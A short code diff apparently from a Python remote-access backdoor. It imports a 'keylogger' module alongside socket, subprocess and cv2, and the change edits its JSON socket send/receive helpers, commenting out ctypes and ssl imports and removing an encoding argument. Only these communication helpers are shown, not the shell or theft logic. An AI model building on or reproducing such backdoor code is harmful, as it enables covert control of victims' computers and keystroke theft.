@@ -1,11 +1,11 @@
 # Standard library imports
-import ctypes
+# import ctypes
 import cv2
 import json
 import os
 import shutil
 import socket
-import ssl
+# import ssl
 import subprocess
 import sys
 import threading
@@ -27,14 +27,14 @@ import keylogger
 
 def reliable_send(data):
     jsondata = json.dumps(data)
-    s.send(jsondata.encode(ENCODING))
+    s.send(jsondata.encode())
 
 
 def reliable_recv():
     data = ''
     while True:
         try:
-            data = data + s.recv(1024).decode(ENCODING).rstrip()
+            data = data + s.recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
             continue
